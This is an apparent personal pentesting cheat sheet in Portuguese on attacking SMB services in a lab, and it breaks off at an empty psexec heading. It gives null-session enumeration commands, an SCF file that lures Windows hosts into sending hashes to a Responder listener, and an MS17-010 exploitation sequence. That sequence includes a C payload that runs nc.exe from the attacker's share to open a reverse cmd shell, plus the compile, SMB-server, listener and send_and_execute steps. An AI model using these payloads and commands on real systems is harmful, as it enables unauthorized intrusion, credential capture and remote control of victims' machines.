SMB
========================

OBS: Para que comporte todos as versões de protocolo, temos que informar o seguinte no arquivo de configuração:

    [global]

    #### Kali configuration (use kali-tweaks to change it) ####

    # By default a Kali system should be configured for wide compatibility,
    # to easily interact with servers using old vulnerable protocols.
       #client min protocol = LANMAN1
       client min protocol = CORE
       client max protocol = SMB3

    ## Browsing/Identification ###
    #   force user = acosta

    # Change this to the workgroup/NT-domain name your Samba server will part of
    #   workgroup = REDECORP


## smbmap


null session

    smbmap -H 10.11.1.227 -u '' -p ''

user guest

    smbmap -H 10.11.1.227 -u guest -p ''
    
## smbclient

    smbclient -L 10.11.1.227 -U 'workgroup/guest'
    <ENTER>
    smbclient -U 'workgroup/guest' //10.11.1.227/share
    <ENTER>

Para conseguir fazer enunmeração mais rapidamente, é interessante que utilizemos o recurso de recursividade no smbclient com os seguintes comandos:

    recurse on
    dir

Desta forma, basta exxecutar esses dois comandos para ele fazer a busca via dir recursivamente

## SCF files

    [Shell]
    Command=2
    IconFile=\\10.10.14.4\smb\uwu.ico
    [Taskbar]
    Command=ToggleDesktop

    sudo responder -I tun0

## ms17-010

    tools
    cd cve/2017-0143/impacket
    source exploit_ms17-010/bin/activate

Nesse momento já temos o ambiente preparado para execução do script, mas temos que preparar o paylolad pra funcionar:

    #include<stdlib.h>
    
    int main() {
    
            int i;
            i = system("START /B \\\\192.168.119.156\\smb\\nc.exe 192.168.119.156 80 -e cmd");
            return 0;
    }
Adequar este payload toda vez que for utilizá-lo

    i686-w64-mingw32-gcc backup.c -o backup.exe
    
    impacket-smbserver -smb2support smb /usr/share/windows-binaries
    nc -nlvp 80
    python ../impacket/send_and_execute.py 10.11.1.227 ../payload/backup.exe
    

## psexec